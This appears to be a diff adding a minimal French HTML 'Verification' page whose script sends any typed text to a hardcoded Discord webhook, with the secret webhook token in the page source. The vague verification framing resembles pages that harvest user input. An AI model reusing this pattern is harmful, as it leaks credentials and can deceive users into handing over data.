@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Verification</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        input {
+            margin-top: 10px;
+            padding: 8px;
+            width: 250px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <h2>Verification</h2>
+
+    <input 
+        id="texte" 
+        type="text" 
+        placeholder="Écris ici..." 
+        onkeypress="if(event.key === 'Enter') envoyer();"
+    >
+
+    <script>
+        function envoyer() {
+            const msg = document.getElementById("texte").value;
+
+            const webhook = "https://discord.com/api/webhooks/1441910520981491754/h3LuLi6kE409dbJ9oRqPR2wvfUD_AmiZblTTAEJyAJdLAzYl3GmNC5x5dHZGrg6FXl0P";
+
+            if (msg.trim() === "") return;
+
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: msg })
+            })
+            .then(() => {
+                document.getElementById("texte").value = "";
+                alert("Envoyé !");
+            })
+            .catch(() => alert("Erreur d’envoi"));
+        }
+    </script>
+</body>
+</html>
